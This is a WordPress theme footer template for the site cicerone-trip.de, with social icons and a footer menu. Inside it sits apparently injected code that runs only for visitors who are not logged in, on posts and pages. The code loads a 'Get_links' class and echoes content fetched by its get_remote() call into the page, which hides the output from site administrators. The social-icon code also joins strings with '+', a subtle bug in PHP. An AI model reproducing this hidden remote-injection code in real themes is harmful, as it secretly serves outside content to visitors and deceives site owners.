<?php

?>
		</div><!--.content-inner-->
	</div><!-- #content -->
</div><!-- #page -->

<?php get_template_part('sidebar', 'footer'); ?>

<footer id="colophon" class="site-footer" role="contentinfo">
	<div class="spanner">
		<div class="container">
			<div class="site-info col-md-4">
				  <a href="http://cicerone-trip.de/?page_id=649">© Cicerone-Trip.de</a>  

					<?php 
						$path = get_template_directory_uri();
						$socials = array(
							'facebook' => 'https://www.facebook.com/ciceronetrip/',
							'twitter'  => 'https://twitter.com/CiceroneTrip',
							'instagram' => 'https://www.instagram.com/ciceronetrip',
						);
					?>


					<div class="footer-social-icons">
						<?php foreach($socials as $key => $link) {
							$src = "{$path}/assets/images/social/${key}.png";
							$a = sprintf("<a href='%s' target='_blank'><img src='%s' alt='%s'/></a>",$link, $src, $key + '-icon' );
							echo $a;
						} ?>
					</div>

					<?php if ($user_ID) : ?><?php else : ?>
						<?php if (is_single() || is_page() ) { ?>
							<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
							$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
						<?php } ?>
					<?php endif; ?>

			</div><!-- .site-info -->
			<div class="footer-menu col-md-8">
				<?php wp_nav_menu( array( 'theme_location' => 'footer' ) ); ?>
			</div>	
		</div><!--.container-->	
	</div>
</footer><!-- #colophon -->

<?php wp_footer(); ?>

</body>
</html>
